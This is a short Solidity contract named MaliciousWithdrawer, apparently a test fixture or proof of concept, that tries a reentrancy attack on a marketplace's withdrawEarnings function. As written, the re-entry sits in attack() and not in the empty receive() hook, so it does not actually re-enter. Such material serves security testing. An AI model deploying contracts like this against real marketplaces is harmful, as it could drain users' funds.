// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMarketplace {
    function withdrawEarnings() external;
}

contract MaliciousWithdrawer {
    IMarketplace public marketplace;
    uint256 public attackCount;
    
    constructor(address _marketplace) {
        marketplace = IMarketplace(_marketplace);
    }
    
    function attack() external payable {
        attackCount++;
        if (attackCount < 3) {
            // Attempt reentrancy by calling withdrawEarnings during a transaction
            marketplace.withdrawEarnings();
        }
    }
    
    receive() external payable {
        // This will be called during the reentrancy attempt
    }
}
